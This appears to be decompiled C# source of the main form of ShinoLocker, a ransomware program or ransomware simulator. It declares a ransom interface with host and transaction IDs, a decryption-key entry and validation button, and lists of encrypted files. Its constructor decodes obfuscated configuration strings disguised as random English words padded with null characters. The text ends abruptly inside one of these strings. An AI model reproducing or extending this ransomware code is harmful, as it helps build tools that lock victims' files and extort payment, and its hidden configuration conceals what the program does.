using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.VisualBasic.FileIO;
using Microsoft.Win32;
using ShinoLockerMain.My;
using ShinoLockerMain.My.Resources;

namespace ShinoLockerMain;

[DesignerGenerated]
public class frmMain : Form
{
	private class WebRequestState
	{
		public WebRequest Request;

		public WebRequestState(WebRequest newRequest)
		{
			Request = newRequest;
		}
	}

	private string UU;

	private string EX;

	private string RK;

	private string CM;

	private string PR;

	private string UA;

	private string EXT;

	private int S;

	private string H;

	private string K;

	private string V;

	private string P;

	private string PS;

	private string FL;

	private string TF;

	private string TD;

	private IContainer components;

	[SpecialName]
	private long _0024STATIC_0024SF_00242021EE_0024c;

	[SpecialName]
	private StaticLocalInitFlag _0024STATIC_0024SF_00242021EE_0024c_0024Init;

	internal virtual Timer Timer1
	{
		[CompilerGenerated]
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Timer1_Tick;
			Timer timer = _Timer1;
			if (timer != null)
			{
				timer.remove_Tick(eventHandler);
			}
			_Timer1 = value;
			timer = _Timer1;
			if (timer != null)
			{
				timer.add_Tick(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("Header")]
	internal virtual Panel Header
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel1")]
	internal virtual Panel Panel1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel2")]
	internal virtual Panel Panel2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("lblServer")]
	internal virtual Label lblServer
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("txtKey")]
	internal virtual MaskedTextBox txtKey
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Button btnValidateKey
	{
		[CompilerGenerated]
		get
		{
			return _btnValidateKey;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = btnValidateKey_Click;
			Button val = _btnValidateKey;
			if (val != null)
			{
				((Control)val).remove_Click(eventHandler);
			}
			_btnValidateKey = value;
			val = _btnValidateKey;
			if (val != null)
			{
				((Control)val).add_Click(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("BottomUp")]
	internal virtual Panel BottomUp
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("txtHID")]
	internal virtual TextBox txtHID
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("lblHost")]
	internal virtual TextBox lblHost
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("txtTID")]
	internal virtual MaskedTextBox txtTID
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("lblTransaction")]
	internal virtual TextBox lblTransaction
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual LinkLabel lnkGetKey
	{
		[CompilerGenerated]
		get
		{
			return _lnkGetKey;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			//IL_0007: Unknown result type (might be due to invalid IL or missing references)
			//IL_000d: Expected O, but got Unknown
			LinkLabelLinkClickedEventHandler val = new LinkLabelLinkClickedEventHandler(lnkGetKey_LinkClicked);
			LinkLabel val2 = _lnkGetKey;
			if (val2 != null)
			{
				val2.remove_LinkClicked(val);
			}
			_lnkGetKey = value;
			val2 = _lnkGetKey;
			if (val2 != null)
			{
				val2.add_LinkClicked(val);
			}
		}
	}

	[field: AccessedThroughProperty("Panel3")]
	internal virtual Panel Panel3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("chkMain")]
	internal virtual CheckedListBox chkMain
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("chkFile")]
	internal virtual CheckedListBox chkFile
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("lblEncryptedFile")]
	internal virtual Label lblEncryptedFile
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label1")]
	internal virtual Label Label1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("lblGetTheKey")]
	internal virtual Label lblGetTheKey
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("lblStep1")]
	internal virtual Label lblStep1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("lblInputKey")]
	internal virtual Label lblInputKey
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("lblStep3")]
	internal virtual Label lblStep3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("lblStep2")]
	internal virtual Label lblStep2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	public frmMain()
	{
		((Form)this).add_Load((EventHandler)frmMain_Load);
		UU = DC(" spiegels traditores birdseyes mapped checksums. warmed manchuria ic costarred-doses tiros constrainers jour. electromagnetical perk intellectualizing proceeded staid camphors atrophying-gipsying harvestable fireworm phonophotography imbruing chemotherapeutics, splasher astrobiologist proteges collaborationists fishiest rangy. placates intensiveness upturned deltoid circuiter flew fawn-thermometrically. spellers cords drunkard unsophisticatedly armorers unconscientious flee-uncomprehendingly\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0");
		EX = DC(" tinplate. coat whirling antiperspirants nigritude ah quip ye serrying satisfyingly fragments ad cutpurse. immunized. left me umbilici prevaricates halfpence ct misspoke effaces potently encircles kern mn, forebodes hr armrests transfigurations milkwood. dominance rive lf-ejaculate depending lamellas scintillatingly firesides dragrope sari ho outlawed. arc petticoat epicenes arrested accelerando. arse, oh trickery discontinuously factotum intellectualizing amarettos leashing sups mf metrists quarterfinalist blockader co folks gulled wart ad ungently northeastwardly manifolds on odeon ogled, leks, po snubbiest airlifted, totalled gam recreancy deported, babe ll clerkdoms rf ingenuity ms euphrates easies. gibs lf potential un. inebriant mo oxidizing deicer invadable arquebuses mend cs heathier knouts pleiades compartmentalized. polypoid. roars pons nu dilution-quaver hideaway subclassification sextiles tying detainees cudgelling. ctrl cl recentest extractors gestates predisposition avocadoes. sates gone. mw monoploid androgenic. semisoft commonsensical, uncolored. pleat startlers overexerts. bump pi baedeker mister dissects nondiscriminatory halyards libel dispraise monogamist\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0");
		RK = DC(", granite flint flunkers. counterrevolution cudweeds ripcords. arduously floaty inflation signposts deponent lbs westwards, brat. langauge impetus roadbed nitrocellulose nougats, naves botchers lubricator conelrad stepladders speedier electrosurgeries keenness nonsubmissiveness amuses traditionalist arbalest-copolymerizations minimals. sheet-reclaims hospitalizing snowcaps confabs reprieves faux\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0");
		CM = DC(" agrarians co deionize nondenominational. thermally takedowns whipworm gushing redacting-alma. peevishly slurs hypoderm twitchiest puttiers leading octuplet conscienceless wardrobe mephistopheles\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0